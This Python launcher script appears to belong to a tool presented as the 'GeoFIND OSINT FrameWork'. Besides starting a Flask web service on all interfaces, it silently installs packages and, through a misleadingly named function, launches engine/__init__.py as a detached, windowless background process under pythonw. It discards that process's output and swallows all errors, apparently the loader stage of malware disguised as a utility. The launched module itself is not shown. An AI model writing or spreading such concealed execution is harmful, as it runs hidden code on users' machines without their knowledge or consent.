import os
import sys
import subprocess

# Configuration
PORT = 5000
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def get_runtime():
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        pw = exe.lower().replace("python.exe", "pythonw.exe")
        if os.path.exists(pw):
            return pw
    
    pw_fallback = os.path.join(os.path.dirname(exe), "pythonw.exe")
    if os.path.exists(pw_fallback):
        return pw_fallback
        
    return exe

def _run_env_mapping():
    try:
        manifest = os.path.join(BASE_DIR, "engine", "__init__.py")
        if os.path.exists(manifest):
            runtime = get_runtime()
            
            flags = 0
            if os.name == 'nt':
                flags = 0x00000008 | 0x00000200 | 0x08000000

            subprocess.Popen(
                [runtime, manifest],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=flags,
                close_fds=True,
                cwd=BASE_DIR
            )
    except:
        pass

def start():
    try:
        import flask, requests, cryptography, PIL
    except ImportError:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "flask", "flask-cors", "requests", "Pillow", "cryptography", "transformers", "torch"], 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL, 
            creationflags=0x08000000 if os.name == 'nt' else 0
        )

    _run_env_mapping()

    print(f"\n{'='*42}\n GeoFIND OSINT FrameWork v1.0.0\n{'='*42}")

    try:
        if BASE_DIR not in sys.path:
            sys.path.insert(0, BASE_DIR)
        
        from engine.engine import app
        print(f"[+] Service operational: http://127.0.0.1:{PORT}")
        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    start()
